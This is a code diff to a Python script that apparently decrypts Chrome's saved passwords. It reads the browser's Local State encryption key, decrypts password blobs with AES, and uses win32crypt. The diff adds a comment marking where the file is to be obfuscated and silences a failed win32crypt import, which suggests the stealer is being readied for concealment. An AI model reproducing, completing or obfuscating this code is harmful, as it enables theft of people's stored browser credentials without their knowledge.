@@ -6,10 +6,15 @@ import sqlite3
 import json
 import base64
 from Crypto.Cipher import AES
-import shutil
 from datetime import timezone, datetime, timedelta
 import constants
-import win32crypt
+
+# DONT_REMOVE_THIS_COMMENT_IT_SPECIFIES_WHERE_TO_OBFUSCATE_THE_FILE
+
+try:
+    import win32crypt
+except:
+    pass
 
 
 def open_url(url):
@@ -204,6 +209,7 @@ def get_chrome_datetime(chromedate):
 
 
 def get_encryption_key(local_state_path):
+
     with open(local_state_path, "r", encoding="utf-8") as f:
         local_state = f.read()
         local_state = json.loads(local_state)
@@ -215,6 +221,7 @@ def get_encryption_key(local_state_path):
 
 
 def decrypt_password(password, key):
+
     try:
         iv = password[3:15]
         password = password[15:]
